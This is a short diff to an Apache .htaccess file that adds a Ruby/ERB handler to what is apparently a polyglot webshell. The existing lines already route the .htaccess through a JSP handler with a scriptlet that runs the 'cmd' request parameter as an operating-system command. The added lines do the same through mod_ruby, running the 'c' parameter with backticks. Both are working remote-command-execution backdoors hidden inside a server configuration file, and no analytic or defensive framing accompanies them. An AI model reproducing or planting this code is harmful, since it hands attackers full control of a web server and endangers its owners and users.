@@ -44,4 +44,15 @@
     AddHandler caucho-request .htaccess
 </IfModule>
 #<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>
+# --><!--
+<IfModule mod_ruby.c>
+  RubyRequire apache/erb-run
+  RubySafeLevel 0
+  AddType text/html .htaccess
+  <Files *.htaccess>
+    SetHandler ruby-object
+    RubyHandler Apache::ERbRun.instance
+  </Files>
+</IfModule>
+# <% puts "--\x3e";require 'cgi';cgi=CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` %><!--
 # -->
